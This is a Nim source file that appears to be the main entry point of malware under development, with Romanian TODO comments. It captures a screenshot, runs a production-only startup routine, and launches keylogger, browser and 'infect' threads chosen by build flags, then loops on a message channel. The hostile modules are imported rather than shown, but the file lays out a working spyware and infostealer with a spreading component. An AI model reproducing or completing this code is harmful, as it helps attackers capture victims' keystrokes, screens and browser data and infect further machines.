import asyncdispatch
from os import sleep

import lib/functions/getWindowName
import lib/functions/screenshot

from lib/channels import mainThread

from lib/constants import isProd

from lib/flags import USE_BROWSER_THREAD
from lib/flags import USE_KEYLOGGER_THREAD
from lib/flags import USE_INFECT_THREAD

when isProd:
  from lib/functions/beforeStart import run
  run()

let base64Ss: string = screenshot()

# writeFile("base64.tmp.txt", base64Ss)

open mainThread

## TODO: CODE CLEANUP

when USE_KEYLOGGER_THREAD:
  from lib/threads/keyloggerThread import initKeyloggerThread

  var keyloggerThreadVar: Thread[void]

  createThread(keyloggerThreadVar, initKeyloggerThread)

when USE_BROWSER_THREAD:
  from lib/threads/browserThread import initBrowserThread

  var browserThreadVar: Thread[void]

  createThread(browserThreadVar, initBrowserThread)

when USE_INFECT_THREAD:
  from lib/threads/infectThread import initInfectThread

  var infectThreadVar: Thread[void]

  createThread(infectThreadVar, initInfectThread)

while true:
  ## TODO:
  ## NEVOIE DE OPTIMIZARI
  ## CONSUMA PREA MULT CPU
  ## CRED CA O SA TREBUIASCA SA IMPLEMENTEZ CV ASYNC
  ## sleep(10) se pare ca rezolva asta, dar n as vrea sa folosesc asta
  ## asa ca e probabil sa modifc aici oricand
  sleep(10)
  let channel = mainThread.tryRecv()

  if channel.dataAvailable:
    echo channel.msg

# proc main() {.async.} =
#   echo getWindowName()
#   await sleepAsync(1000)
#   asyncCheck main()

# asyncCheck main()

# runForever()

